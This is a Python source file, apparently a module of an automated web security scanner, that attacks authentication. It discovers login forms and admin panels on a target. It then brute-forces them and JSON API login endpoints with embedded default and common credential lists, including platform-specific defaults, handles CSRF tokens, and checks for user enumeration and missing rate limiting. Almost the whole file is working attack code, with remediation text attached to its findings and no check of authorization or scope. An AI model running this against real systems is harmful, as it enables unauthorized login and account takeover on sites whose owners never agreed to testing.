"""
Auth Attack Module — Brute force login forms, test default credentials, enumerate users.

A real hacker:
1. Finds login forms and admin panels
2. Tests default/common credentials
3. Checks for user enumeration (different responses for valid/invalid users)
4. Attempts credential stuffing with common combos
5. Tests account lockout policies
6. Checks for rate limiting on auth endpoints
"""
import asyncio
import logging
import re
import time
from urllib.parse import urljoin, urlparse

import httpx

logger = logging.getLogger(__name__)

# Common credentials to try — ordered by likelihood (top from real breach data)
COMMON_CREDS = [
    # Most common admin creds
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "Password1"),
    ("admin", "changeme"),
    ("admin", "12345678"),
    ("admin", "qwerty"),
    ("admin", "1234"),
    ("admin", "admin1234"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "Welcome1"),
    ("admin", "Admin@123"),
    ("admin", "password123"),
    ("admin", "P@ssw0rd"),
    ("admin", "admin@123"),
    ("admin", "Admin123!"),
    ("admin", "pass123"),
    ("admin", "abc123"),
    ("admin", "test"),
    ("admin", "master"),
    ("admin", "dragon"),
    # Root
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("root", "123456"),
    ("root", "changeme"),
    # Other common users
    ("test", "test"),
    ("test", "test123"),
    ("user", "user"),
    ("user", "password"),
    ("user", "user123"),
    ("guest", "guest"),
    ("demo", "demo"),
    ("demo", "demo123"),
    ("operator", "operator"),
    ("manager", "manager123"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("admin", ""),
    ("sa", ""),
    ("sa", "sa"),
    ("postgres", "postgres"),
    # Service accounts
    ("support", "support"),
    ("service", "service"),
    ("api", "api123"),
    ("deploy", "deploy"),
    ("staging", "staging"),
    ("dev", "dev123"),
    # Email-based (common in modern apps)
    ("admin@admin.com", "admin"),
    ("admin@admin.com", "password"),
    ("admin@admin.com", "admin123"),
    ("test@test.com", "test"),
    ("test@test.com", "password"),
    ("admin@example.com", "admin"),
    ("admin@example.com", "password"),
    ("user@example.com", "password"),
]

# Default credentials for known platforms
PLATFORM_CREDS = {
    "wordpress": [("admin", "admin"), ("admin", "password"), ("admin", "wp-admin")],
    "joomla": [("admin", "admin"), ("admin", "joomla")],
    "drupal": [("admin", "admin"), ("admin", "drupal")],
    "tomcat": [("tomcat", "tomcat"), ("admin", "admin"), ("manager", "manager"), ("tomcat", "s3cret")],
    "jenkins": [("admin", "admin"), ("admin", "password"), ("admin", "jenkins")],
    "phpmyadmin": [("root", ""), ("root", "root"), ("root", "password"), ("root", "mysql")],
    "grafana": [("admin", "admin"), ("admin", "grafana")],
    "kibana": [("elastic", "changeme"), ("elastic", "elastic")],
    "rabbitmq": [("guest", "guest"), ("admin", "admin")],
    "gitlab": [("root", "5iveL!fe"), ("admin", "admin")],
    "sonarqube": [("admin", "admin")],
    "portainer": [("admin", "admin")],
    "dvwa": [("admin", "password"), ("gordonb", "abc123"), ("pablo", "letmein")],
    "juiceshop": [("admin@juice-sh.op", "admin123"), ("jim@juice-sh.op", "ncc-1701")],
    "minio": [("minioadmin", "minioadmin"), ("admin", "admin")],
    "elasticsearch": [("elastic", "changeme"), ("elastic", "elastic")],
    "redis": [("", ""), ("", "redis"), ("", "password")],
    "mongodb": [("admin", "admin"), ("root", "root"), ("admin", "password")],
    "mysql": [("root", ""), ("root", "root"), ("root", "password"), ("root", "mysql")],
    "postgres": [("postgres", "postgres"), ("postgres", "password")],
    "airflow": [("airflow", "airflow"), ("admin", "admin")],
    "superset": [("admin", "admin")],
    "hasura": [("admin", "admin")],
    "strapi": [("admin@admin.com", "admin"), ("admin", "admin")],
    "keycloak": [("admin", "admin"), ("admin", "Pa55w0rd")],
    "vault": [("vault", "vault")],
    "consul": [("consul", "consul")],
    "nexus": [("admin", "admin123")],
    "artifactory": [("admin", "password")],
    "zabbix": [("Admin", "zabbix"), ("guest", "")],
    "nagios": [("nagiosadmin", "nagios"), ("nagiosadmin", "nagiosadmin")],
}

# Common login paths to discover
LOGIN_PATHS = [
    "/login", "/signin", "/auth/login", "/user/login",
    "/admin/login", "/admin", "/administrator",
    "/wp-login.php", "/wp-admin",
    "/accounts/login", "/account/login",
    "/api/login", "/api/auth/login", "/api/v1/auth/login",
    "/auth/signin", "/session/new",
    # Additional discovery
    "/rest/user/login", "/api/sessions", "/api/token",
    "/oauth/token", "/connect/token", "/api/authenticate",
    "/manager/html", "/manager", "/console",
    "/j_security_check",  # Java
    "/Account/Login", "/Identity/Account/Login",  # .NET
    "/users/sign_in",  # Rails
    "/login.asp", "/login.aspx",
    # Admin panels
    "/phpmyadmin", "/adminer.php", "/pgadmin",
    "/kibana/login", "/grafana/login",
    "/_plugin/head", "/jenkins/login",
    "/portainer", "/traefik",
    # SSO/OAuth endpoints
    "/.well-known/openid-configuration",
    "/oauth/authorize", "/oauth2/authorize",
    "/saml/login", "/sso/login",
    "/.auth/me",  # Azure App Service
]

# Usernames for enumeration
ENUM_USERNAMES = [
    "admin", "administrator", "root", "test", "user", "guest",
    "info", "support", "contact", "webmaster", "postmaster",
    "sales", "demo", "operator", "manager", "staff",
]


class AuthAttackModule:
    """Brute force login forms, test default creds, enumerate users."""

    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def run(self, context: dict) -> list[dict]:
        """Run all auth attacks based on discovered data."""
        findings = []
        base_url = context.get("base_url", "")
        if not base_url:
            return []

        # Discover login forms
        login_forms = await self._discover_login_forms(base_url, context)
        if login_forms:
            logger.info(f"Auth attack: found {len(login_forms)} login forms")

        # Detect platform for targeted creds
        technologies = context.get("technologies", {})
        platform = self._detect_platform(technologies)

        # Attack each login form
        for form in login_forms:
            # 1. User enumeration check
            enum_result = await self._check_user_enumeration(form, base_url)
            if enum_result:
                findings.append(enum_result)

            # 2. Brute force with common creds
            brute_results = await self._brute_force_form(form, base_url, platform)
            findings.extend(brute_results)

            # 3. Rate limiting check
            rate_result = await self._check_rate_limiting(form, base_url)
            if rate_result:
                findings.append(rate_result)

        # Check for API auth endpoints
        endpoints = context.get("endpoints", [])
        api_auth_results = await self._attack_api_auth(endpoints, base_url, platform)
        findings.extend(api_auth_results)

        logger.info(f"Auth attack: {len(findings)} findings")
        return findings

    async def _discover_login_forms(self, base_url: str, context: dict) -> list[dict]:
        """Find login forms by checking common paths and parsing HTML."""
        forms = []

        # Check known login paths
        async with httpx.AsyncClient(timeout=10.0, verify=False,
                                      follow_redirects=True) as client:
            for path in LOGIN_PATHS:
                url = urljoin(base_url + "/", path)
                try:
                    async with self.rate_limit:
                        resp = await client.get(url)
                        if resp.status_code == 200 and "text/html" in resp.headers.get("content-type", ""):
                            form = self._extract_login_form(resp.text, url)
                            if form:
                                forms.append(form)
                except Exception:
                    continue

        # Also check forms discovered by endpoint module
        endpoints = context.get("endpoints", [])
        for ep in endpoints:
            ep_url = ep.get("url") if isinstance(ep, dict) else ep
            if not ep_url:
                continue
            if any(kw in ep_url.lower() for kw in ["login", "signin", "auth", "session"]):
                if ep_url not in [f.get("action_url") for f in forms]:
                    try:
                        async with httpx.AsyncClient(timeout=10.0, verify=False,
                                                      follow_redirects=True) as client:
                            async with self.rate_limit:
                                resp = await client.get(ep_url)
                                if resp.status_code == 200:
                                    form = self._extract_login_form(resp.text, ep_url)
                                    if form:
                                        forms.append(form)
                    except Exception:
                        continue

        return forms[:5]  # Max 5 login forms

    def _extract_login_form(self, html: str, page_url: str) -> dict | None:
        """Parse HTML to find login form with username/password fields."""
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(html, "html.parser")

        for form in soup.find_all("form"):
            inputs = form.find_all("input")
            username_field = None
            password_field = None
            other_fields = {}
            csrf_token = None

            for inp in inputs:
                inp_type = (inp.get("type") or "text").lower()
                inp_name = inp.get("name") or inp.get("id") or ""

                if inp_type == "password":
                    password_field = inp_name
                elif inp_type in ("text", "email") and not username_field:
                    username_field = inp_name
                elif inp_type == "hidden":
                    value = inp.get("value", "")
                    if any(t in inp_name.lower() for t in ["csrf", "token", "_token", "nonce"]):
                        csrf_token = (inp_name, value)
                    else:
                        other_fields[inp_name] = value

            if password_field and username_field:
                action = form.get("action", "")
                if action and not action.startswith("http"):
                    action = urljoin(page_url, action)
                elif not action:
                    action = page_url

                method = (form.get("method") or "POST").upper()

                return {
                    "page_url": page_url,
                    "action_url": action,
                    "method": method,
                    "username_field": username_field,
                    "password_field": password_field,
                    "other_fields": other_fields,
                    "csrf_token": csrf_token,
                    "has_csrf": csrf_token is not None,
                }

        return None

    def _detect_platform(self, technologies: dict) -> str | None:
        """Detect platform from fingerprinted technologies."""
        tech_str = str(technologies).lower()
        for platform in PLATFORM_CREDS:
            if platform in tech_str:
                return platform
        return None

    async def _brute_force_form(self, form: dict, base_url: str,
                                  platform: str | None) -> list[dict]:
        """Try common credentials against a login form."""
        findings = []
        action_url = form["action_url"]
        username_field = form["username_field"]
        password_field = form["password_field"]

        # Build credential list
        creds = list(COMMON_CREDS)
        if platform and platform in PLATFORM_CREDS:
            # Platform-specific creds first
            creds = PLATFORM_CREDS[platform] + creds

        # Deduplicate
        seen = set()
        unique_creds = []
        for u, p in creds:
            key = (u, p)
            if key not in seen:
                seen.add(key)
                unique_creds.append((u, p))

        # First, get a baseline failed login response
        baseline = await self._attempt_login(form, "phantom_nonexistent_user_xz9", "phantom_wrong_pass_xz9")
        if not baseline:
            return []

        baseline_status = baseline.get("status")
        baseline_len = baseline.get("body_len")
        baseline_indicators = baseline.get("indicators", [])

        successful = 0
        for username, password in unique_creds[:30]:  # Max 30 attempts
            try:
                result = await self._attempt_login(form, username, password)
                if not result:
                    continue

                # Detect successful login
                if self._is_login_success(result, baseline):
                    findings.append({
                        "title": f"Default credentials work: {username}:{password}",
                        "url": action_url,
                        "severity": "critical",
                        "vuln_type": "auth_bypass",
                        "payload": f"username={username}&password={password}",
                        "method": form["method"],
                        "impact": f"Login successful with {username}:{password} at {action_url}. "
                                 f"Full account access obtained.",
                        "remediation": "Change default credentials immediately. "
                                      "Enforce strong password policy. "
                                      "Implement account lockout after failed attempts.",
                    })
                    successful += 1
                    if successful >= 3:
                        break  # Don't need more than 3 successful creds

            except Exception:
                continue

        return findings

    async def _attempt_login(self, form: dict, username: str, password: str) -> dict | None:
        """Attempt a single login and return response details."""
        async with self.rate_limit:
            try:
                data = dict(form.get("other_fields", {}))
                data[form["username_field"]] = username
                data[form["password_field"]] = password

                if form.get("csrf_token"):
                    # Re-fetch the page to get fresh CSRF token
                    async with httpx.AsyncClient(timeout=10.0, verify=False,
                                                  follow_redirects=True) as client:
                        page_resp = await client.get(form["page_url"])
                        fresh_form = self._extract_login_form(page_resp.text, form["page_url"])
                        if fresh_form and fresh_form.get("csrf_token"):
                            token_name, token_value = fresh_form["csrf_token"]
                            data[token_name] = token_value

                async with httpx.AsyncClient(timeout=10.0, verify=False,
                                              follow_redirects=False) as client:
                    if form["method"] == "POST":
                        resp = await client.post(form["action_url"], data=data)
                    else:
                        resp = await client.get(form["action_url"], params=data)

                    body = resp.text.lower()
                    indicators = []

                    # Success indicators
                    if resp.status_code in (301, 302, 303, 307):
                        location = resp.headers.get("location", "").lower()
                        if any(s in location for s in ["dashboard", "home", "panel", "admin", "welcome"]):
                            indicators.append("redirect_to_dashboard")
                        elif "login" in location or "error" in location:
                            indicators.append("redirect_to_login")
                        else:
                            indicators.append("redirect_other")

                    if "set-cookie" in str(resp.headers).lower():
                        cookies = resp.headers.get_list("set-cookie") if hasattr(resp.headers, 'get_list') else [resp.headers.get("set-cookie", "")]
                        for cookie in cookies:
                            if cookie and any(s in cookie.lower() for s in ["session", "auth", "token", "jwt"]):
                                indicators.append("auth_cookie_set")

                    if any(s in body for s in ["welcome", "dashboard", "logout", "sign out", "my account"]):
                        indicators.append("success_content")

                    if any(s in body for s in ["invalid", "incorrect", "wrong", "failed", "error", "denied"]):
                        indicators.append("error_message")

                    return {
                        "status": resp.status_code,
                        "body_len": len(resp.text),
                        "indicators": indicators,
                        "body_snippet": body[:500],
                    }

            except Exception:
                return None

    def _is_login_success(self, result: dict, baseline: dict) -> bool:
        """Determine if a login attempt was successful by comparing to baseline."""
        indicators = result.get("indicators", [])

        # Strong success signals
        if "auth_cookie_set" in indicators and "redirect_to_dashboard" in indicators:
            return True
        if "success_content" in indicators and "error_message" not in indicators:
            return True
        if "redirect_to_dashboard" in indicators and "error_message" not in indicators:
            return True
        if "auth_cookie_set" in indicators and "error_message" not in indicators:
            # Different response from baseline
            if abs(result["body_len"] - baseline["body_len"]) > 100:
                return True

        # Different status code from baseline (e.g., 302 vs 200)
        if result["status"] != baseline["status"]:
            if result["status"] in (301, 302, 303, 307):
                if "redirect_to_login" not in indicators:
                    return True

        return False

    async def _check_user_enumeration(self, form: dict, base_url: str) -> dict | None:
        """Check if the app reveals whether a username exists."""
        # Try with a definitely-existing username and a random one
        valid_names = ["admin", "administrator", "root"]
        invalid_name = "phantom_nonexistent_user_xyzq9"

        responses = {}

        for name in valid_names + [invalid_name]:
            result = await self._attempt_login(form, name, "wrong_password_xyz123")
            if result:
                responses[name] = result

        if not responses.get(invalid_name):
            return None

        invalid_resp = responses[invalid_name]

        for name in valid_names:
            if name not in responses:
                continue
            valid_resp = responses[name]

            # Different response length suggests enumeration
            len_diff = abs(valid_resp["body_len"] - invalid_resp["body_len"])
            status_diff = valid_resp["status"] != invalid_resp["status"]

            # Check for different error messages
            valid_snippet = valid_resp.get("body_snippet", "")
            invalid_snippet = invalid_resp.get("body_snippet", "")

            message_diff = False
            if "error_message" in valid_resp.get("indicators", []) and "error_message" in invalid_resp.get("indicators", []):
                # Both have error messages but different content
                if valid_snippet != invalid_snippet and len_diff > 20:
                    message_diff = True

            if (len_diff > 50 and status_diff) or message_diff:
                return {
                    "title": f"User enumeration via login form",
                    "url": form["action_url"],
                    "severity": "medium",
                    "vuln_type": "auth_bypass",
                    "payload": f"Valid user '{name}' response differs from invalid user",
                    "method": form["method"],
                    "impact": f"Login form at {form['action_url']} returns different responses "
                             f"for valid vs invalid usernames. Response length diff: {len_diff} bytes. "
                             f"Attackers can enumerate valid usernames.",
                    "remediation": "Return identical error messages for invalid username "
                                  "and invalid password scenarios.",
                }

        return None

    async def _check_rate_limiting(self, form: dict, base_url: str) -> dict | None:
        """Check if login endpoint has rate limiting."""
        start_time = time.time()
        success_count = 0
        total_attempts = 10

        for i in range(total_attempts):
            result = await self._attempt_login(form, f"testuser{i}", "wrongpass")
            if result and result["status"] not in (429, 503):
                success_count += 1
            elif result and result["status"] == 429:
                # Rate limiting detected
                return None  # Good — rate limiting works
            await asyncio.sleep(0.1)  # Small delay

        elapsed = time.time() - start_time

        if success_count == total_attempts:
            return {
                "title": f"No rate limiting on login endpoint",
                "url": form["action_url"],
                "severity": "medium",
                "vuln_type": "auth_bypass",
                "payload": f"Sent {total_attempts} login attempts in {elapsed:.1f}s — no blocking",
                "method": form["method"],
                "impact": f"Login endpoint {form['action_url']} allows unlimited login attempts. "
                         f"{total_attempts} requests in {elapsed:.1f}s without rate limiting. "
                         f"Vulnerable to brute force attacks.",
                "remediation": "Implement rate limiting (e.g., max 5 attempts per minute). "
                              "Add CAPTCHA after 3 failed attempts. "
                              "Implement progressive delays or account lockout.",
            }

        return None

    async def _attack_api_auth(self, endpoints: list, base_url: str,
                                 platform: str | None) -> list[dict]:
        """Attack API authentication endpoints (JSON-based login)."""
        findings = []
        api_login_urls = []

        for ep in endpoints:
            ep_url = ep.get("url") if isinstance(ep, dict) else ep
            if not ep_url:
                continue
            ep_lower = ep_url.lower()
            if any(kw in ep_lower for kw in ["/api/login", "/api/auth", "/api/token",
                                               "/auth/login", "/api/signin"]):
                api_login_urls.append(ep_url)

        # Also check standard API auth paths
        for path in ["/api/auth/login", "/api/login", "/api/token", "/api/v1/auth/login"]:
            url = urljoin(base_url + "/", path)
            if url not in api_login_urls:
                api_login_urls.append(url)

        creds = list(COMMON_CREDS[:15])
        if platform and platform in PLATFORM_CREDS:
            creds = PLATFORM_CREDS[platform] + creds

        async with httpx.AsyncClient(timeout=10.0, verify=False,
                                      follow_redirects=False) as client:
            for api_url in api_login_urls[:3]:
                for username, password in creds[:15]:
                    try:
                        async with self.rate_limit:
                            # Try JSON body
                            resp = await client.post(api_url, json={
                                "username": username,
                                "password": password,
                            })

                            if resp.status_code == 429:
                                break  # Rate limited — good

                            if resp.status_code == 200:
                                body = resp.text
                                # Check for JWT or access token in response
                                if any(t in body for t in ['"token"', '"access_token"',
                                                            '"jwt"', '"session"']):
                                    # Verify it's a real token, not just field names
                                    try:
                                        data = resp.json()
                                        token = (data.get("token") or data.get("access_token")
                                                or data.get("jwt") or "")
                                        if isinstance(token, str) and len(token) > 20:
                                            findings.append({
                                                "title": f"API default credentials: {username}:{password}",
                                                "url": api_url,
                                                "severity": "critical",
                                                "vuln_type": "auth_bypass",
                                                "payload": f'{{"username":"{username}","password":"{password}"}}',
                                                "method": "POST",
                                                "impact": f"API login at {api_url} accepts "
                                                         f"default credentials {username}:{password}. "
                                                         f"JWT/token obtained: {token[:30]}...",
                                                "remediation": "Change default API credentials. "
                                                              "Enforce strong passwords.",
                                            })
                                    except Exception:
                                        pass

                            # Also try form-encoded
                            resp2 = await client.post(api_url, data={
                                "username": username,
                                "password": password,
                            })
                            if resp2.status_code == 200 and resp2.status_code != resp.status_code:
                                try:
                                    data = resp2.json()
                                    token = (data.get("token") or data.get("access_token") or "")
                                    if isinstance(token, str) and len(token) > 20:
                                        findings.append({
                                            "title": f"API default credentials (form): {username}:{password}",
                                            "url": api_url,
                                            "severity": "critical",
                                            "vuln_type": "auth_bypass",
                                            "payload": f"username={username}&password={password}",
                                            "method": "POST",
                                            "impact": f"API accepts form-encoded default creds. "
                                                     f"Token: {token[:30]}...",
                                            "remediation": "Change default credentials.",
                                        })
                                except Exception:
                                    pass

                    except Exception:
                        continue

        return findings
